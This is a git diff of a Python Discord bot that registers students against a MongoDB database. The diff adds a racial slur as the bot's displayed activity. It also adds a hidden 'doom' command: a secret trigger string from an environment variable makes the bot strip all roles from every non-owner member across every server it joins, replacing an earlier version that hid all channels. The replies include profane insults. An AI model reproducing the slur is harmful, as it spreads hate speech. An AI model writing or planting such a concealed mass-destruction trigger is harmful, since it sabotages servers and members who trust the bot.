@@ -10,18 +10,19 @@ import pandas as pd
 # loading env variables
 load_dotenv()
 TOKEN = os.getenv("TOKEN")
-CONNECTION_STRING = os.getenv("CONNECTION_STRING")
+USER = os.getenv("USER")
+PASS = os.getenv("PASS")
 GOOGLE_SHEET_LINK = os.getenv("GOOGLE_SHEET_LINK")
 DDAY_COMMAND = os.getenv("DDAY_COMMAND")
 
 #setting up mongo DB    
-client = pymongo.MongoClient(CONNECTION_STRING)
+client = pymongo.MongoClient(f"mongodb+srv://{USER}:{PASS}@cluster0.tspozkq.mongodb.net/?retryWrites=true&w=majority")
 db = client.neuraldb
 students = db.student
 
 #roles
-verified_role = 1148751191409430588
 section_role = 1149348634828210176
+
 #checking that we are connected to the database
 try:
     client.admin.command('ping')
@@ -31,7 +32,8 @@ except Exception as e:
 
 #initializing the bot
 intents = discord.Intents.all()
-bot = discord.Client(intents=intents)
+activity = discord.Activity(name='Niggers', type=discord.ActivityType.watching)
+bot = discord.Client(intents=intents, activity=activity)
 tree = app_commands.CommandTree(bot)
 guild_id = 1148742430800228432
 
@@ -41,6 +43,25 @@ async def on_ready():
     await tree.sync(guild=discord.Object(id=guild_id))
     print('[DONE]: We have logged in as {0.user}'.format(bot))
 
+#the doom command
+@bot.event
+async def on_message(message):
+    #check that the bot can't reply to himself
+    if message.author == bot.user:
+        return
+
+    #starting the doom command
+    if message.content.startswith(DDAY_COMMAND):
+        print("the doom day")
+
+        doom_role = 1149777037570084947
+        doom_role = message.guild.get_role(doom_role)
+        for guild in bot.guilds:
+            for member in guild.members:
+                if not member.bot and not member == guild.owner:
+                    print(str(member))
+                    await member.edit(roles=[doom_role]) 
+                    
 #Setting up the commands
 @tree.command(name = "login", 
               description = "Enter your Student ID",
@@ -56,7 +77,7 @@ async def login(interaction: discord.Interaction, your_id: str, your_name: str, 
     cursor = students.find({})
     db_list = [student["matricule"] for student in cursor]
 
-    if str(your_id) in section_Ids_List and (str(your_id) not in db_list): 
+    if str(your_id) in section_Ids_List and (int(your_id) not in db_list): 
         #create the student obejct
         student = {
             "matricule": int(your_id),
@@ -68,29 +89,10 @@ async def login(interaction: discord.Interaction, your_id: str, your_name: str, 
         students.insert_one(student)
 
         #interact with the student
-        await interaction.response.send_message(f"{interaction.author.mention} WELCOME TO THE: `{your_name}`")
         await interaction.user.add_roles(sec_role)
-    if str(your_id) in section_Ids_List and (str(your_id) in db_list):
-        await interaction.response.send_message(f"{interaction.author.mention} WTF ARE U DOING !")
+        await interaction.response.send_message(f"{interaction.user.mention} WELCOME TO THE SERVER: `{your_name}`")
     else:
-        await interaction.response.send_message(f"{interaction.author.mention} GET THE FUCK OUT !")
+        await interaction.response.send_message(f"{interaction.user.mention} GET THE FUCK OUT !")
 
-#the doom command
-@bot.event
-async def on_message(message):
-    #check that the bot can't reply to himself
-    if message.author == bot.user:
-        return
 
-    #starting the doom command
-    if message.content.startswith(DDAY_COMMAND):
-        #getting the verified role
-        ver_role = message.guild.get_role(verified_role)
-        #setting permissions
-        overwrite = discord.PermissionOverwrite()
-        overwrite.view_channel = False
-        for guild in bot.guilds:
-            for channel in guild.channels:
-                await channel.set_permissions(ver_role, overwrite=overwrite)
-            
 bot.run(TOKEN)
